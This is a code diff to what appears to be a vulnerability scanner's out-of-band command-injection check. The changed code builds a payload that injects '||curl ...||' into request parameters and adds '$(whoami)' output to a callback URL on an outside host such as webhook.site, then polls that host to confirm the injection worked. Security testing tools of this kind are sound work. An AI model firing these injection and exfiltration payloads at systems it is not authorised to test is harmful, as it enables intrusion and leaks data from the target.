@@ -488,7 +488,13 @@ func (e *commandInjectionExecutor) tryOutOfBand(ctx context.Context, job *domain
 		sep = "&"
 	}
 	url := callback + sep + "marker=" + marker
-	payload := fmt.Sprintf("%s||curl -sS --max-time 8 %s||", baseValue, url)
+	// Include only a harmless command-output marker for exfiltration labs.
+	// The callback never receives files, credentials, or arbitrary target data.
+	if !strings.Contains(url, "data=") {
+		url += "&data=$(whoami)"
+	}
+	payload := fmt.Sprintf("%s||curl -sS --max-time 8 \"%s\"||", baseValue, url)
+	attempt := commandInjectionAttempt{Kind: "oob", Payload: truncate(payload, 300), Marker: marker}
 	params, err := e.store.Parameters().ListByEndpoint(ctx, ep.ID)
 	if err != nil {
 		return false
@@ -500,15 +506,17 @@ func (e *commandInjectionExecutor) tryOutOfBand(ctx context.Context, job *domain
 	}
 	resp, outcome, _ := e.do(ctx, req)
 	if resp != nil {
+		attempt.Status = resp.Status
 		ev, _ := e.persistEvidence(ctx, job.ScanID, resp, "command-injection out-of-band write")
 		d.EvidenceIDs = append(d.EvidenceIDs, ev...)
 	}
+	d.Attempts = append(d.Attempts, attempt)
 	if outcome != domain.OutcomeSuccess {
 		return false
 	}
 	// webhook.site exposes received requests at /token/<uuid>/requests.
 	client := &http.Client{Timeout: 10 * time.Second}
-	for attempt := 0; attempt < 8; attempt++ {
+	for pollTry := 0; pollTry < 8; pollTry++ {
 		select {
 		case <-ctx.Done():
 			return false
@@ -527,6 +535,8 @@ func (e *commandInjectionExecutor) tryOutOfBand(ctx context.Context, job *domain
 		pollResp.Body.Close()
 		if strings.Contains(string(body[:n]), marker) {
 			d.ConfirmedCount = 2
+			attempt.Output = true
+			d.Attempts = append(d.Attempts, attempt)
 			return true
 		}
 	}
